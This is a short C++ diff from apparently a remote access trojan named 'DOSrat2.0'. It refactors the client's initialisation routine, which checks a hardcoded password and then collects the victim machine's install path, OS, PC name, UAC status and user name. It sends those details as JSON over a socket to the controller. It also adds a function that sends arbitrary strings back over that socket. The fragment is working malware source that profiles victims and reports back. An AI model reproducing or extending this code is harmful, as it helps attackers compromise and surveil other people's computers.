@@ -13,7 +13,7 @@ class COMUNICAZIONI
 		static bool Inizializzazione(SOCKET Sock)
 		{
 			DirUtils du;
-			GeneralUtils gu;
+			SystemUtils su;
 
 			char Pass[10] = "DOSrat2.0";
 
@@ -40,15 +40,23 @@ class COMUNICAZIONI
 			json data;
 
 			data["InstallPath"] = du.GetFullFilePath();
-			data["OS"] = GetOS();
-			data["PCname"] = gu.GetPCName();
-			data["UAC"] = gu.CheckUAC();
-			data["UserName"] = gu.GetCurrentUser();
+			data["OS"] = su.GetOS();
+			data["PCname"] = su.GetPCName();
+			data["UAC"] = su.CheckUAC();
+			data["UserName"] = su.GetCurrentUser();
 			data["Versione"] = Version;
 
 			TcpIP::SendString(Sock, data.dump());
 
 			cout << data.dump() << endl;
 			return true;
+		}
+
+		static bool GetInfo(SOCKET Sock, string Str)
+		{
+			if (TcpIP::SendString(Sock, Str))
+				return true;
+
+			return false;
 		}
 };
